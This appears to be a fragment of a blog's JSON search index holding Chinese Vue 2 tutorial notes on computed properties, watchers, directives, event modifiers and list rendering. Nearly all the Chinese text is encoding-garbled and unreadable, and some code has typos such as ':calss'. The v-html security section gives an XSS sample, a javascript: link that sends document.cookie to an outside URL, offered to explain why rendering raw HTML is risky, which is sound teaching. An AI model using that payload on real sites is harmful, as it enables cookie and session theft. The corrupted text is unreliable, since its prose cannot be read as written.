è®¡ç®—å±æ€§å€¼ä¼šç¼“å­˜èµ·æ¥ï¼Œå†æ¬¡è°ƒç”¨ä¸ä¼šé‡å¤è®¡ç®—                    æ‰€ä¾èµ–çš„å±æ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå³ä¾èµ–çš„æ•°æ®è°ƒç”¨äº†setter        è®¡ç®—å±æ€§æ²¡æœ‰ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œå…¶å–å€¼éƒ½æ˜¯éœ€è¦ç»è¿‡è®¡ç®—çš„                  è®¡ç®—å±æ€§çš„setterï¼š          æ²¡æœ‰è¿™ä¸ªå±æ€§ï¼Œä¸å…è®¸ä¿®æ”¹å…¶å€¼      å•å•è°ƒç”¨setterä¸ä¼šå¼•èµ·é¡µé¢ä¸Šå€¼çš„æ”¹å˜ â€” å…¶ä¾èµ–çš„å±æ€§å€¼æ²¡æœ‰å˜åŒ–      setterè¦åŒæ—¶ä¿®æ”¹å…¶ä¾èµ–çš„å€¼ï¼Œé¡µé¢æ‰ä¼šå˜åŒ–      computed: {    fullName: {        get() {            console.log(\"getèƒŒè°ƒç”¨\");            return this.firstName + '-' + this.lastName        },        set(value) {            const str = value.split('-');            this.firstName = str[0];            this.lastName = str[1];        }    }}è®¡ç®—å±æ€§ä¸ç›‘è§†å±æ€§çš„å¯¹æ¯”â€‹\tcomputerå¯ä»¥å®Œæˆçš„äº‹æƒ…ï¼Œwatchä¹Ÿå¯ä»¥å®Œæˆ      è®¡ç®—å±æ€§ï¼Œåœ¨åˆå§‹åŒ–æ—¶å¯ä»¥ä¸å­˜åœ¨ï¼Œç»è¿‡è®¡ç®—åï¼Œå­˜æ”¾_data_        ç›‘è§†å±æ€§ï¼Œå¿…é¡»åœ¨ä¸€å¼€å§‹å°±å­˜åœ¨ï¼Œä¿®æ”¹åæ‰ä¼šå½±å“_data_        è®¡ç®—å±æ€§æ˜¯ä¾èµ–é¡¹å‘ç”Ÿå˜åŒ–ï¼Œç«‹å³è®¡ç®—ï¼›ä¾èµ–é¡¹æ²¡æœ‰å˜åŒ–ï¼Œåˆ™ä¸ä¼šé‡æ–°è®¡ç®—ï¼Œè€Œæ˜¯åœ¨ç¼“å­˜ä¸­    å°†ä¿®æ”¹åçš„å€¼äº¤ç»™å®šæ—¶å™¨è¿”å›ï¼Œä½†è®¡ç®—çš„å±æ€§åœ¨è®¡ç®—æ—¶æ²¡æœ‰è¿”å›å€¼ï¼Œæ‰€ä»¥é¡µé¢åˆ·æ–°æ—¶æ²¡æœ‰æ‹¿åˆ°è¿”å›å€¼ï¼Œé¡µé¢ä¸å˜        ç›‘è§†å±æ€§ï¼Œå¯ä»¥è®¾ç½®å¼‚æ­¥å‡½æ•°æ‰§è¡Œï¼›è®¡ç®—å±æ€§ï¼Œåªèƒ½æ‰§è¡ŒåŒæ­¥å‘½ä»¤    ç›‘è§†å‡½æ•°é‡Œé¢çš„å®šæ—¶å™¨ï¼ˆajaxç­‰å›è°ƒå‡½æ•°ï¼Œä¸å±äºVueç®¡ç†ï¼‰ï¼Œå¿…é¡»æ˜¯ç®­å¤´å‡½æ•°ï¼ˆå¾€å¤–æ‰¾thisï¼Œå³å®ä¾‹vmï¼‰  ç›‘è§†å±æ€§åº”ç”¨åœºæ™¯ï¼š å¯¹äºå€¼ä¿®æ”¹å‰åæ¯”è¾ƒï¼Œè¶…è¿‡æŸä¸ªé˜™å€¼è¿›è¡ŒæŸäº›æ“ä½œ&lt;div id=\"root\"&gt;    &lt;h2&gt;ä»Šå¤©æ˜¯ä¸ª{{weather}}æ—¥å­&lt;/h2&gt;    &lt;button @click=\"changeWeater\"&gt;åˆ‡æ¢å¤©æ°”&lt;/button&gt;    &lt;!-- å½“éœ€è¦è®¡ç®—çš„ä¸œè¥¿ï¼Œæ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€ä¸ªï¼Œå¯ä»¥å†™åœ¨è¿™é‡Œï¼›å…¶å€¼åœ¨æŒ‚è½½çš„å®ä¾‹vmä¸­æ‰¾--&gt;    &lt;!-- å¦‚æœéœ€è¦æœ‰ä¸¤ä¸ªå€¼å˜åŒ–ï¼Œæœ€å¥½ä½¿ç”¨methodæˆ–è€…watch --&gt;    &lt;button @click=\"isHot = !isHot\"&gt;åˆ‡æ¢å¤©æ°”&lt;/button&gt;&lt;/div&gt;const vm = new Vue({    el: '#root',    data: { isHot: true },    computed: {        weather() {            return this.isHot ? 'ç‚çƒ­' : 'å‡‰çˆ½'        }    },    methods: {        changeWeater() { this.isHot = !this.isHot }    },    watch: {        // å¯¹dataå€¼ ç›‘è§†        isHot: {                immediate: true, // æ˜¯å¦ç«‹å³æ‰§è¡Œï¼Ÿ å¯ç”¨äºå±æ€§åˆå§‹åŒ–æ—¶è°ƒç”¨            // hardler ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨ï¼Ÿ  -- å½“ç›‘è§†çš„å±æ€§ï¼Œå‘ç”Ÿå˜åŒ–çš„æ—¶å€™            handler(newValue, oldValue) {                console.log(newValue, oldValue);            }        },        // å¯¹è®¡ç®—å±æ€§ ç›‘è§†        weather: {            handler(newValue, oldValue) {                console.log(newValue, oldValue);            }        }    }})// å¯¹å®ä¾‹æœ€ä½³ç›‘è§†å±æ€§ï¼švm.$watch('ç›‘è§†çš„å±æ€§å',{   \thandler(newValue, oldValue) {        console.log(newValue, oldValue);    }});ç®€å†™â€‹\tå‰æï¼šä¸éœ€è¦ immediateï¼Œ ä¸éœ€è¦deepï¼Œ æˆ–å…¶ä»–é…ç½®é¡¹watch:{\tisHot(newValue, oldValue){        console.log(newValue, oldValue);    }}vm.$watch('ç›‘è§†çš„å±æ€§å',function(){    console.log(newValue, oldValue);    // this æŒ‡å‘è°ƒç”¨è€… vm    // å¦‚æœæ˜¯ç®­å¤´å‡½æ•°ï¼Œ()=&gt;{}, thisæŒ‡å‘window})æ·±åº¦ç›‘è§†â€‹\tVueæä¾›çš„ watché»˜è®¤ä¸è¿›è¡Œå¤šçº§ç»“æ„ç›‘è§† ï¼Œ deep:true; å¯¹å¤šçº§ç»“æ„è¿›è¡Œ æ‰€æœ‰å±æ€§å˜åŒ–ç›‘è§†ï¼›â€‹\tVueè‡ªèº«æ˜¯å¯ä»¥ç›‘è§†åˆ°å¤šçº§ç»“æ„çš„new Vue({    el: \"#root\",    data: {        number: { a: 1 }    },    watch: {        'number.a': { // å±æ€§é»˜è®¤æ˜¯å­—ç¬¦ä¸²ï¼Œæ— æ³•ä½¿ç”¨. æ‰€ä»¥è¦è½¬æ¢ä¸ºå­—ç¬¦ä¸²            handler() {                console.log('aæ”¹å˜äº†');            }        },        // å¦‚æœnumberé‡Œé¢æœ‰æ— æ•°å¤šçš„å€¼ï¼Œæ— æ³•ä¸€ä¸€ç›‘è§†ï¼Œæ‰€ä»¥éœ€è¦æ·±åº¦ç›‘è§†        // 1. ç›´æ¥ä¿®æ”¹numberå¯¹è±¡ -- numberæ˜¯ä¸€ä¸ªå¼•ç”¨å¯¹è±¡ï¼Œå†…éƒ¨å€¼æ”¹å˜å¹¶ä¸ä¼šå½±å“å…¶åœ¨å†…éƒ¨çš„åœ°å€           // 2. ä½¿ç”¨é…ç½®é¡¹ deep:true        number: {            deep: true, // ç›‘è§†å¤šçº§ç»“æ„ä¸­æ‰€æœ‰å±æ€§çš„å˜åŒ–              handler() {                console.log('numberæ”¹å˜äº†');            }        }    }})"
  },
  
  {
    "title": "VueæŒ‡ä»¤",
    "url": "/posts/Vue%E6%8C%87%E4%BB%A4/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-14 00:00:00 +0800",
    





    
    "snippet": "v-cloakâ€‹\tå¤–éƒ¨jsè„šæœ¬å¼•å…¥çš„ ä½ç½®ï¼Œä¼šå½±å“åŠ è½½çš„é¡ºåºï¼›v-cloaké˜»æ­¢æœªç»åŠ è½½å®Œçš„ç»“æ„æ¸²æŸ“åˆ°é¡µé¢ä¸Š  æ·»åŠ äº†v-cloakçš„å…ƒç´ ï¼Œåœ¨Vue.js å®ä¾‹åˆ›å»ºã€åŠ è½½å®Œæˆåï¼Œå°†å»é™¤è¿™ä¸ªv-cloak å±æ€§  æ‰€æœ‰å¯ä»¥åœ¨DIVä¸Šæ·»åŠ v-cloakä½¿å…¶åœ¨ä¸ºåŠ è½½å®Œæ—¶ [v-cloak]:{display:none} éšè—å…¶å­˜åœ¨  è€ŒåŠ è½½å®Œåï¼Œå»é™¤äº†è¿™ä¸ªå±æ€§ï¼ŒDIVå°±éœ²å‡ºæ¥äº†v-onceâ€‹\tåªè¯»...",
    "content": "v-cloakâ€‹\tå¤–éƒ¨jsè„šæœ¬å¼•å…¥çš„ ä½ç½®ï¼Œä¼šå½±å“åŠ è½½çš„é¡ºåºï¼›v-cloaké˜»æ­¢æœªç»åŠ è½½å®Œçš„ç»“æ„æ¸²æŸ“åˆ°é¡µé¢ä¸Š  æ·»åŠ äº†v-cloakçš„å…ƒç´ ï¼Œåœ¨Vue.js å®ä¾‹åˆ›å»ºã€åŠ è½½å®Œæˆåï¼Œå°†å»é™¤è¿™ä¸ªv-cloak å±æ€§  æ‰€æœ‰å¯ä»¥åœ¨DIVä¸Šæ·»åŠ v-cloakä½¿å…¶åœ¨ä¸ºåŠ è½½å®Œæ—¶ [v-cloak]:{display:none} éšè—å…¶å­˜åœ¨  è€ŒåŠ è½½å®Œåï¼Œå»é™¤äº†è¿™ä¸ªå±æ€§ï¼ŒDIVå°±éœ²å‡ºæ¥äº†v-onceâ€‹\tåªè¯»å– å…ƒç´ çš„åˆå§‹å€¼ï¼Œå³ç¬¬ä¸€æ¬¡å–çš„å€¼  v-onceæ‰€åœ¨èŠ‚ç‚¹ï¼Œåœ¨åˆæ¬¡åŠ¨æ€æ¸²æŸ“åï¼Œå°±è§†ä¸ºé™æ€å†…å®¹  æ‰€ä»¥æ•°æ®çš„æ”¹å˜ä¸ä¼šå¼•èµ·æ‰€åœ¨èŠ‚ç‚¹çš„æ›´æ–°ï¼Œå¯ä»¥ç”¨äºä¼˜åŒ–æ€§èƒ½v-preâ€‹\tVueè·³è¿‡æ‰€åœ¨èŠ‚ç‚¹çš„ç¼–è¯‘  åº”ç”¨äºæ²¡æœ‰æŒ‡ä»¤è¯­æ³•ã€æ²¡æœ‰ä½¿ç”¨æ’å€¼è¯­æ³•çš„èŠ‚ç‚¹ï¼Œä¼šåŠ å¿«ç¼–è¯‘å†…å®¹ç»‘å®šV-text  v-textæŒ‡ä»¤çš„ä½œç”¨æ˜¯ï¼šè®¾ç½®æ ‡ç­¾çš„å†…å®¹ï¼ˆtextContentï¼‰[ç±»ä¼¼innerText]  é»˜è®¤å†™æ³•ä¼š æ›¿æ¢å…¨éƒ¨å†…å®¹ï¼Œä½¿ç”¨å·®å€¼è¡¨è¾¾å¼{{ }}å¯ä»¥æ›¿æ¢æŒ‡å®šå†…å®¹  è®¾ç½®æ ‡ç­¾çš„å†…å®¹ ï¼ˆä»¥å­—ç¬¦ä¸²ï¼Œå…¨éƒ¨è¾“å‡ºï¼‰ï¼Œæ”¯æŒè¡¨è¾¾å¼V-html  v-htmlæŒ‡ä»¤çš„ä½œç”¨æ˜¯ï¼šè®¾ç½®å…ƒç´ çš„innerHTML  å†…å®¹ä¸­æœ‰htmç»“æ„ï¼Œä¼šè¢«è§£æä¸ºæ ‡ç­¾  v-textæŒ‡ä»¤æ— è®ºå†…å®¹æ˜¯ä»€ä¹ˆï¼Œåªä¼šè§£æä¸ºæ–‡æœ¬  éƒ¨åˆ†æ›¿æ¢æ ‡ç­¾å†…å®¹: {{ }}è¿™ç§å†™æ³•  å…¨éƒ¨æ›¿æ¢ æ ‡ç­¾å†…å®¹: v-textå’Œx-htmlè§£ææ–‡æœ¬ä½¿ç”¨v-textï¼Œè§£æhtmlç»“æ„ä½¿ç”¨v-htmlå®‰å…¨æ€§é—®é¢˜      åœ¨ç½‘ç«™ä¸ŠåŠ¨æ€æ¸²æŸ“ä»»æ„çš„HTMLéƒ½æ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“å¯¼è‡´XSSæ”»å‡»        v-html:'&lt;a href=javascript:location.href=\"http://www.baidu.com?\"+document.cookis&gt;&lt;/a&gt;    åœ¨é¡µé¢ä¸Šè·å– cookieï¼Œå¹¶æºå¸¦è·³è½¬ï¼Œå°†ä¼ªè£…ç™»å½•        æµè§ˆå™¨ä¿æŠ¤æœºåˆ¶ï¼šcookie è®¾ç½® HttpOnly â€” åªæœ‰ httpåè®®æ‰å¯ä»¥è¯»å–çš„cookieå€¼  äº‹ä»¶å¤„ç†ç»‘å®š v-on:new Vue({    methods:{        functionName(even){            // ç¬¬ä¸€ä¸ªå‚æ•° é»˜è®¤æ˜¯ã€ç‚¹å‡»äº‹ä»¶ã€‘            // thisæ˜¯ è°ƒç”¨è€…vm        },        functionName2:(event) =&gt; {            // ç¬¬ä¸€ä¸ªå‚æ•° é»˜è®¤æ˜¯ã€ç‚¹å‡»äº‹ä»¶ã€‘            // thisæ˜¯ è°ƒç”¨è€…window -- ä¸åº”è¯¥        }        functionName3(a,event){            // ç¬¬ä¸€ä¸ªå‚æ•° æ˜¯ä¼ é€’çš„å‚æ•°    \t\t// ç¬¬äºŒä¸ªå‚æ•° æ˜¯ç‚¹å‡»äº‹ä»¶            // thisæ˜¯ è°ƒç”¨è€…vmã€ç»„ä»¶å¯¹è±¡        }    }})&lt;button v-on:click=\"functionName\"&gt; ç‚¹å‡»æŒ‰é’®ï¼Œè°ƒç”¨å‡½æ•° &lt;/button&gt;&lt;button @click=\"functionName3(555,$event)\"&gt; ç‚¹å‡»æŒ‰é’®ï¼Œè°ƒç”¨å‡½æ•° &lt;/button&gt;      æ‰€æœ‰è¢«Vueç®¡ç†çš„å‡½æ•°ï¼Œéƒ½åº”è¯¥æ˜¯æ™®é€šå‡½æ•°        v-on:å…ƒç´ ç»‘å®šäº‹ä»¶        äº‹ä»¶åä¸éœ€è¦å†™onï¼ŒæŒ‡ä»¤å¯ä»¥ç®€å†™ä¸º@click,@dblclick        ç»‘å®šçš„æ–¹æ³•å®šä¹‰åœ¨methodså±æ€§ä¸­    äº‹ä»¶ç»‘å®šå¯å†™ä¸ºå‡½æ•°è°ƒç”¨å½¢å¼ï¼Œå¯ä¼ å…¥è‡ªå®šä¹‰å‚æ•°        ç»™è°ç»‘å®šï¼Œæ‰¾è°è§¦å‘  äº‹ä»¶ä¿®é¥°ç¬¦â€‹\täº‹ä»¶ä¿®é¥°ç¬¦å¯ä»¥è¿ç€å†™ï¼Œé¡ºåºæ‰§è¡Œï¼š\t@click().prevent.stop  é˜»æ­¢é»˜è®¤äº‹ä»¶  .prevent&lt;div id=\"root\"&gt;    &lt;a href=\"http://baidu.com\" @click=\"showInfo\"&gt;ç‚¹æˆ‘æ˜¾ç¤ºæç¤ºä¿¡æ¯&lt;/a&gt;    &lt;!-- 2. äº‹ä»¶ä¿®é¥°ç¬¦.prevent é˜»æ­¢é»˜è®¤äº‹ä»¶ --&gt;     &lt;a href=\"http://baidu.com\" @click.prevent=\"showInfo\"&gt;ç‚¹æˆ‘æ˜¾ç¤ºæç¤ºä¿¡æ¯&lt;/a&gt;&lt;/div&gt;const vm =  new Vue({    el:'#root',    methods:{        showInfo(e){            e.preventDefault(); // 1. é˜»æ­¢ é»˜è®¤äº‹ä»¶ï¼ˆåŸç”Ÿå†™æ³•ï¼‰            alert(\"hello!\")        }    }})      é˜»æ­¢äº‹ä»¶å†’æ³¡ .stop    äº‹ä»¶å†’æ³¡ï¼šçˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹åŒæœ‰äº‹ä»¶ï¼Œç‚¹å‡»å­èŠ‚ç‚¹æ—¶ï¼Œäº‹ä»¶ä¼šå‘çˆ¶çº§ä¸€çº§ä¸€çº§ï¼ˆç›¸åŒäº‹ä»¶ï¼‰å‘ç”Ÿï¼Œç›´è‡³æ ¹èŠ‚ç‚¹ã€‚ï¼ˆå†’æ³¡æ˜¯å‘å¤–å‘ç”Ÿçš„ï¼Œä½†è§¦å‘çš„targetä¾ç„¶æ˜¯å­èŠ‚ç‚¹ï¼‰  &lt;div id=\"root\" @click=\"showInfo\"&gt;    &lt;button @click=\"showInfo\"&gt;ç‚¹æˆ‘ &lt;/button&gt;    &lt;!-- 2. äº‹ä»¶ä¿®é¥°ç¬¦.stop é˜»æ­¢å†’æ³¡äº‹ä»¶: ç»™å­å…ƒç´ åŠ  --&gt;     &lt;button @click.stop=\"showInfo\"&gt;ç‚¹æˆ‘ &lt;/button&gt;&lt;/div&gt;const vm =  new Vue({    el:'#root',    methods:{        showInfo(e){            e.stopPropagation(); // 1. é˜»æ­¢ å†’æ³¡äº‹ä»¶ï¼ˆåŸç”Ÿå†™æ³•ï¼‰            alert(\"hello!\")        }    }})  äº‹ä»¶åªè§¦å‘ä¸€æ¬¡ .once&lt;div id=\"root\" @click=\"showInfo\"&gt;    &lt;button @click.once=\"showInfo\"&gt;ç‚¹æˆ‘ &lt;/button&gt;&lt;/div&gt;      ä½¿ç”¨äº‹ä»¶çš„æ•è·é˜¶æ®µ .capture    äº‹ä»¶æ•è·ï¼šçˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹åŒæœ‰äº‹ä»¶ï¼Œç‚¹å‡»å­èŠ‚ç‚¹æ—¶ï¼Œæ˜¯ä»çˆ¶èŠ‚ç‚¹ä¸€çº§ä¸€çº§å‘å†…æ•è·ç›®æ ‡å…ƒç´ çš„ã€‚ï¼ˆæ•è·æ˜¯å‘å†…çš„ï¼‰    åœ¨æ•è·æœŸé—´å°±å¤„ç†äº‹ä»¶ â€” å‘çˆ¶çº§ã€å†å­çº§  &lt;div id=\"root\"&gt;    &lt;div class=\"box1\" @click.capture=\"showMsg(1)\"&gt; // åŠ äº†.captureåï¼Œæ‰“å° 1 2        div1        &lt;div class=\"box2\" @click=\"showMsg(2)\"&gt;div2&lt;/div&gt; // ç‚¹å‡»div2ï¼Œæ‰“å° 2 1    &lt;/div&gt;&lt;/div&gt;const vm = new Vue({    el: '#root',    methods: {        showMsg(value) {            console.log(value);        }    }})  åªæœ‰event.targetæ˜¯å½“å‰çš„å…ƒç´ ï¼Œæ‰å¯ä»¥è§¦å‘clickçš„äº‹ä»¶  .self&lt;div id=\"root\" @click.self=\"showInfo($event,1)\"&gt; // æœ‰selfæ—¶ï¼Œ1 2    &lt;button @click=\"showInfo($event,2)\"&gt;ç‚¹æˆ‘ &lt;/button&gt;  // æ²¡æœ‰selfæ—¶ï¼Œ2 1&lt;/div&gt;const vm = new Vue({    el:\"#root\",    data:{},    methods:{        showInfo(e,value){            console.log(e.target,value);        }    }})      äº‹ä»¶é»˜è®¤è¡Œä¸ºç«‹å³æ‰§è¡Œï¼Œæ— éœ€ç­‰å¾…äº‹ä»¶å›è°ƒ  .passive    ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäº‹ä»¶è§¦å‘åï¼Œå¤„ç†å®Œæˆï¼Œæ‰ä¼šå†å›æ¥æ‰§è¡Œæ–°çš„è§¦å‘äº‹ä»¶ â€” ç§»åŠ¨ç«¯é¡¹ç›®ä½¿ç”¨è¾ƒå¤š  é”®ç›˜å’Œé¼ æ ‡äº‹ä»¶  é¼ æ ‡äº‹ä»¶ï¼š @Wheelâ€” é¼ æ ‡æ»šè½®  é”®ç›˜äº‹ä»¶ï¼š          keydownï¼šåœ¨é”®ç›˜ä¸ŠæŒ‰ä¸‹æŸä¸ªé”®æ—¶è§¦å‘ã€‚                  å¦‚æœæŒ‰ä½æŸä¸ªé”®ï¼Œä¼šä¸æ–­è§¦å‘è¯¥äº‹ä»¶ï¼Œ          è¯¥äº‹ä»¶å¤„ç†å‡½æ•°è¿”å› false æ—¶ï¼Œä¼šå–æ¶ˆé»˜è®¤çš„åŠ¨ä½œï¼ˆå¦‚è¾“å…¥çš„é”®ç›˜å­—ç¬¦ï¼Œåœ¨ IE å’Œ Safari æµè§ˆå™¨ä¸‹è¿˜ä¼šç¦æ­¢keypress äº‹ä»¶å“åº”ï¼‰ã€‚                    keypressï¼šæŒ‰ä¸‹æŸä¸ªé”®ç›˜é”®å¹¶é‡Šæ”¾æ—¶è§¦å‘ã€‚                  å¦‚æœæŒ‰ä½æŸä¸ªé”®ï¼Œä¼šä¸æ–­è§¦å‘è¯¥äº‹ä»¶ã€‚          è¯¥äº‹ä»¶å¤„ç†å‡½æ•°è¿”å› false æ—¶ï¼Œä¼šå–æ¶ˆé»˜è®¤çš„åŠ¨ä½œï¼ˆå¦‚è¾“å…¥çš„é”®ç›˜å­—ç¬¦ï¼‰ã€‚                    keyupï¼šé‡Šæ”¾æŸä¸ªé”®ç›˜é”®æ—¶è§¦å‘ã€‚                  è¯¥äº‹ä»¶ä»…åœ¨æ¾å¼€é”®ç›˜æ—¶è§¦å‘ä¸€æ¬¡ï¼Œä¸æ˜¯ä¸€ä¸ªæŒç»­çš„å“åº”çŠ¶æ€ã€‚                      åœ¨é”®ç›˜è¾“å…¥æŸä¸ªå€¼æ—¶ï¼Œè§¦å‘å‡½æ•°&lt;div id=\"root\" @click.self=\"showInfo($event,1)\"&gt;    &lt;!-- åŸç”Ÿjsè§£å†³ --&gt;    &lt;input type=\"text\" placeholder=\"æŒ‰ä¸‹å›è½¦ï¼Œæ˜¾ç¤ºè¾“å…¥å†…å®¹\" @keyup=\"showInfo\"&gt;     &lt;!-- Vueæ·»åŠ äº‹ä»¶ä¿®é¥°ç¬¦ .enter --&gt;    &lt;input type=\"text\" placeholder=\"æŒ‰ä¸‹å›è½¦ï¼Œæ˜¾ç¤ºè¾“å…¥å†…å®¹\" @keyup.enter=\"showInfo\"&gt;&lt;/div&gt;const vm = new Vue({    el:\"#root\",    data:{},    methods:{        showInfo(e){            // if(e.keyCode !== 13) return;  åŸç”Ÿjsè§£å†³            console.log(e.target.value);        }    }})æŒ‰é”®åˆ«å  Vueä¸­æä¾›çš„ å¸¸ç”¨æŒ‰é”®åˆ«åï¼š            æŒ‰é”®      é”®å      æŒ‰é”®      é”®å                  å›è½¦      enter      åˆ é™¤ï¼ˆâ€œé€€æ ¼â€ã€â€œåˆ é™¤â€ï¼‰      delete              é€€å‡º      esc      ç©ºæ ¼      space              æ¢è¡Œ      tab      Â       Â               ä¸Š      up      ä¸‹      down              å·¦      left      å³      right      â€‹\t\ttab å°†ç„¦ç‚¹ä»å½“å‰å…ƒç´ åˆ‡èµ°ï¼Œæ²¡æŠ¬èµ·æ¥å°±å¤±å»ç„¦ç‚¹äº†ï¼Œç¨‹åºæ£€æµ‹ä¸åˆ°ï¼›ä½¿ç”¨@keydown.tabï¼Œä¸€æŒ‰ä¸‹å°±æ£€æµ‹åˆ°      Vueä¸­æœªæä¾›çš„ï¼Œå¯ä»¥ä½¿ç”¨åŸå§‹keyCodeç»‘å®šï¼ˆä¸å»ºè®®ï¼‰ã€æˆ–éœ€è¦è½¬ä¸ºcaps-lockï¼ˆä¸¤ä¸ªå•è¯ç»„æˆï¼Œéƒ½å°å†™ï¼Œä¸­é—´-éš”å¼€ï¼‰    ç³»ç»Ÿä¿®é¥°é”®ï¼ˆç”¨æ³•ç‰¹æ®Šï¼‰ â€” CTRLã€altã€shiftã€meta          keyup:  æŒ‰ä¸‹ä¿®é¥°é”®çš„åŒæ—¶ï¼Œéœ€è¦å†æŒ‰ä¸‹å¦ä¸€ä¸ªå…¶ä»–é”®ï¼Œé‡Šæ”¾å…¶ä»–é”®ï¼Œäº‹ä»¶æ‰ä¼šè§¦å‘      keydownï¼šæŒ‰ä¸‹ä¿®é¥°é”®ï¼Œæ­£å¸¸è§¦å‘      ä¸¤ä¸ªé”®é…åˆè§¦å‘ .ctrl.y        è‡ªå®šä¹‰åˆ«åï¼š Vue.config.keyCodes.è‡ªå®šä¹‰é”®å = é”®ç æ˜¾ç¤ºç»‘å®šV-show  è®¾ç½®æ•°æ®æ˜¯å¦æ˜¾ç¤º  DOMæ ‡ç­¾ä»ç„¶å­˜åœ¨ï¼Œä¸èƒ½ç”¨äºæƒé™æ“ä½œï¼Œæ ·å¼éšè—ï¼Œä½ç½®ä¸ä¿ç•™  ä¸&lt;template&gt;ç»„é˜Ÿä½¿ç”¨ï¼Œæ— æ•ˆ  é¢‘ç¹åˆ‡æ¢ä½¿ç”¨V-if  ä½¿ç”¨å¸ƒå°”å€¼åˆ¤æ–­ï¼Œç›´æ¥ä½œç”¨äºæ•°æ®æ ‡ç­¾æ˜¯å¦å­˜åœ¨  DOMæ ‡ç­¾åœ¨falseå€¼æ—¶ï¼Œç›´æ¥è¢«ç§»é™¤ï¼Œ å»ºè®®ä¸&lt;template&gt;ç»„é˜Ÿä½¿ç”¨  ä¸é¢‘ç¹åˆ‡æ¢ä½¿ç”¨ï¼Œå•æ¬¡åˆ¤æ–­ï¼ˆä¸v-elseã€v-else-ifä½¿ç”¨æ—¶ä¸èƒ½æ‰“æ–­ï¼‰ç»‘å®šå±æ€§V-Bind  è¯­æ³•\t// å®Œæ•´å†™æ³•: v-bind:å±æ€§å,ç®€å†™:å±æ€§å\t&lt;img v-bind:src='imgSrc'&gt;\t&lt;img v-bind:title='imgTitle'+111&gt;\t&lt;img v-bind:class=\"isActive?'active':''\"&gt;\t&lt;img v-bind:class=\"{active:isActive}\"&gt;  éœ€è¦åŠ¨æ€å¢åˆ classï¼Œå»ºè®®ä½¿ç”¨å¯¹è±¡çš„æ–¹å¼      ç»‘å®šæ–¹å¼: å¯¹è±¡è¯­æ³•(:class=å¯¹è±¡å)          å¯¹è±¡å:                  'key':value          'className':booleanï¼šå¦‚æœbooleanå€¼ä¸ºçœŸ,åˆ™æ˜¾ç¤ºæ”¹ç±»å;å¦åˆ™ä¸ºç©º          className: functionName() â€” return classNameï¼ˆå¯è¿”å›å¤šä¸ªæ ·å¼ç±»åï¼‰                    ç”¨æ³•:                  ç›´æ¥ç»‘å®š &lt;h2 :calss=\"{'active':isActive}\"&gt; hello &lt;/h2&gt;          åˆ¤æ–­ä¼ å…¥å¤šä¸ªå€¼ &lt;h2 :calss=\"{'active':isActive, 'line':isLine}\"&gt; hello &lt;/h2&gt;          ä¸æ™®é€šçš„ç±»åŒæ—¶å­˜åœ¨ &lt;h2 class='title' :class={'active':isActive}&gt; hello &lt;/h2&gt;          å°†å‚æ•°æ”¾å…¥æ–¹æ³•/è®¡ç®— &lt;h2 :class=\"classes\"&gt; hello &lt;/h2&gt; ã€‚                          ç»‘å®šæ–¹å¼: æ•°ç»„è¯­æ³•(:class=æ•°ç»„)          å‚æ•°:              å‚æ•°ä¸º'active'æ—¶,ä½œä¸ºå­—ç¬¦ä¸²      å‚æ•°ä¸ºactiveæ—¶,ä½œä¸ºå˜é‡              ç”¨æ³•                  ç›´æ¥ç»‘å®š &lt;h2 :class=\"[active]\"&gt;Hello world&lt;/h2&gt;          ä¼ å…¥å¤šä¸ªå€¼ &lt;h2ï¼šclass=\"[active,line]\"&gt;Hello world&lt;/h2&gt;          ä¸æ™®é€šçš„ç±»åŒæ—¶å­˜åœ¨ &lt;h2 class=\"title\"ï¼šclass=\"[active,line]\"&gt;Hello world&lt;/h&gt;          å°†å‚æ•°æ”¾å…¥æ–¹æ³•/è®¡ç®— &lt;h2 class=\"title\"ï¼šclass=\"classes\"&gt;Hello world&lt;/h2&gt;                          ç»‘å®šå¤šä¸ªå±æ€§å€¼ï¼šï¼ˆå¼•å…¥ç»„ä»¶éœ€è¦å¤šä¸ªé…ç½®å€¼æ—¶ï¼‰          v-bind( {marginTop:5px, backgroud:#333} )      åˆ—è¡¨æ¸²æŸ“åˆ—è¡¨å¾ªç¯ v-for  æƒ³ç”Ÿæˆè°ï¼Œå°±åœ¨è°èº«ä¸Šä½¿ç”¨for&lt;divÂ id=\"root\"&gt;    &lt;ul&gt;        &lt;!-- ã€éå†æ•°ç»„ã€‘ --&gt;        &lt;liÂ v-for=\"(item,Â id)Â inÂ person\"Â :key=\"id\"&gt;{{item.name}}Â +Â {{item.id}}&lt;/li&gt;        &lt;!-- ã€éå†å¯¹è±¡ã€‘å…ˆå€¼ï¼Œåé”® --&gt;        &lt;li v-for=\"(value, key) in car\" :key=\"key\"&gt;{{key}} :: {{value}}&lt;/li&gt;        &lt;!-- ã€éå†å­—ç¬¦ä¸²ã€‘å…ˆå­—æ¯ï¼Œå†ä¸‹æ ‡ --&gt;        &lt;li v-for=\"(item, index) in str\" :key=\"index\"&gt;{{item}} -- {{index}}&lt;/li&gt;            &lt;/ul&gt;&lt;/div&gt;  æ ¹æ®æ•°æ®ç”Ÿæˆåˆ—è¡¨ç»“æ„  ç»“åˆçš„æ•°æ®ç±»å‹å¯ä¸º: æ•°ç»„ï¼Œå¯¹è±¡ï¼Œæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œè¿­ä»£å™¨  (item,index) in æ•°æ® å¯è‡ªåŠ¨ç”Ÿæˆæ•°æ®ä¸ªæ•°çš„åˆ—è¡¨æ ‡ç­¾,å†…å®¹ä¸ºitem,ç´¢å¼•ä»¥0å¼€å§‹  åœ¨æ ‡ç­¾ç»“æ„å†…ï¼Œå¾ªç¯å‚æ•°å¯é‡å¤ä½¿ç”¨(åœ¨ä½œç”¨åŸŸå†…)  å“åº”å¼: æ•°ç»„é•¿åº¦çš„æ›´æ–°åŒæ­¥åœ¨é¡µé¢ä¸Š! :keykey æŒ‡å¯¼Vueçš„è™šæ‹ŸDOMç®—æ³•diffæ—¶ï¼ŒåŒºåˆ«æ˜¯ä¸åŒçš„å…ƒç´ ï¼Œä»è€Œé¿å…è¢«è®¤ä¸ºé‡å¤å¯¹è±¡è€Œè¢«ç§»é™¤      